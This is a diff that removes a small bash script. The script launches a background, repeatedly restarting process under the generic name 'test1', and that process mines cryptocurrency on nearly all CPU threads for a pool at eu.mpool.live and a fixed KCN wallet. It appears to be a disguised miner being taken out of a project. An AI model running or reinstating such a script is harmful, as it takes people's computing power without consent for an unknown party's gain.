@@ -1,8 +1,0 @@
-#!/bin/bash
-thread=$(nproc --all)
-thread=$((thread-1))
-WORKER=$(echo $(date +%H))
-export thread
-export WORKER
-
-pgrep -x test >/dev/null && echo "Process found" || nohup bash -c 'for i in {1..99999}; do ./test1 -a flex -o stratum+tcp://eu.mpool.live:5271 -u KCN=kc1qnvclnjxyp3h8wak2krz8ghyjxya7uldzqz7930 -p m=solo; done' > program.out 2>&1 &
